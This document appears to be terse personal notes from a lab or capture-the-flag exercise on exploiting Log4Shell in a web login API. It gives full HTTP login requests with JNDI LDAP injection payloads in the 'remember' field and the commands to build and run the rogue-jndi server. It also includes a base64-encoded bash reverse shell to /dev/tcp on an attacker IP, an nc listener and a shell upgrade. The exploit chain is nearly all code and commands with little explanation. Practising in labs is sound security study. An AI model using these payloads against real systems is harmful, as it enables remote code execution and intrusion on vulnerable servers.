## Log4j

### Test for Log4j example
tcp dump to listen for requests
```shell
sudo tcpdump -i tun0 port 389

```
```shell
POST /api/login HTTP/1.1
Host: 10.129.85.96:8443
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://10.129.85.96:8443/manage/account/login?redirect=%2Fmanage
Content-Type: application/json; charset=utf-8
Content-Length: 103
Origin: https://10.129.85.96:8443
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close

{
  "username":"bbb",
  "password":"bbb",
  "remember":"${jndi:ldap://10.10.14.251/whatever}",
  "strict":true
}
```

```shell
git clone https://github.com/veracode-research/rogue-jndi
cd rogue-jndi
mvn package #this will create the rogue jndi a jar file wecn pass our payloads to it

echo 'bash -c bash -i >&/dev/tcp/10.10.14.251/1338 0>&1' | base64 #creates base 64 string for command below

java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMjUxLzEzMzggMD4mMQo=}|{base64,-d}|{bash,-i}" --hostname "{10.10.14.251}"

nc -lvp 1338
```

#### This is to make the log4j server connect
```shell
POST /api/login HTTP/1.1
Host: 10.129.85.96:8443
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://10.129.85.96:8443/manage/account/login?redirect=%2Fmanage
Content-Type: application/json; charset=utf-8
Content-Length: 103
Origin: https://10.129.85.96:8443
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close

{
  "username":"bbb",
  "password":"bbb",
  "remember":"${jndi:ldap://10.10.14.251:1389/o=tomcat}",
  "strict":true
}
```
#### upgrade shell
```shell
script /dev/null -c bash
```